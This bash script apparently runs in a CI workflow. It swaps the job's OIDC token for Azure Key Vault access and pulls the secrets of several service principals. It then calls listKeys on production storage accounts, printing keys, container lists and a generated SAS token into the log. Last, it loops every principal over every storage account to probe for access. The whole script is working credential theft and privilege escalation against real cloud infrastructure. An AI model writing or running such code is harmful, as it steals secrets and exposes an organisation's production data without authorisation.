#!/usr/bin/env bash
set -x
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)

# Get sync-service-principal from KV
SPSEC=$(curl -s -H "Authorization: Bearer $KV" \
  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | jq -r .value)
SA=$(echo "$SPSEC"|jq -r .appId); SK=$(echo "$SPSEC"|jq -r .clientSecret)
echo "sync-service appId: $SA"

# Get mgmt token with sync-service SP
SPMG=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$SA" -d "grant_type=client_credentials" -d "client_secret=$SK" \
  --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
echo "mgmt token len: ${#SPMG}"

# listKeys on sttblcilogsprodx3euoz
echo "=== LISTKEYS sttblcilogsprodx3euoz ==="
KEYS=$(curl -s -X POST -H "Authorization: Bearer $SPMG" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-05-01")
echo "$KEYS" | jq .
KEY1=$(echo "$KEYS" | jq -r '.keys[0].value')
echo "KEY1 length: ${#KEY1}"

# List containers in cilogs
echo "=== CILOGS CONTAINERS ==="
curl -s "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list" \
  -H "x-ms-version: 2021-08-06" \
  -H "x-ms-date: $(date -u '+%a, %d %b %Y %H:%M:%S GMT')" \
  -H "Authorization: Bearer $(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SA" -d "grant_type=client_credentials" -d "client_secret=$SK" \
    --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)" | head -c 2000
echo

# Generate SAS token from storage key for cilogs
echo "=== GENERATE SAS FOR CILOGS ==="
curl -s -X POST -H "Authorization: Bearer $SPMG" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listServiceSas?api-version=2023-05-01" \
  -d '{"canonicalizedResource":"/blob/sttblcilogsprodx3euoz","signedResource":"c","signedPermission":"rl","signedExpiry":"2026-12-01T00:00:00Z","signedProtocol":"https"}' | jq .

# Also try listKeys on sttblappcfgprodx3euoz with sync-service
echo "=== LISTKEYS sttblappcfgprodx3euoz (sync-service) ==="
curl -s -X POST -H "Authorization: Bearer $SPMG" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-05-01" | jq .

# Try ALL SPs for listKeys on ALL storage accounts
echo "=== TRY ALL SPs × ALL STORAGE ==="
for SP in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal; do
  SEC=$(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
  SPA=$(echo "$SEC"|jq -r .appId); SPK=$(echo "$SEC"|jq -r .clientSecret)
  MG=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SPA" -d "grant_type=client_credentials" -d "client_secret=$SPK" \
    --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
  for ACCT in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: Bearer $MG" -H "Content-Length: 0" \
      "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$ACCT/listKeys?api-version=2023-05-01")
    echo "  $SP × $ACCT = $CODE"
  done
done

echo "=== DONE ==="
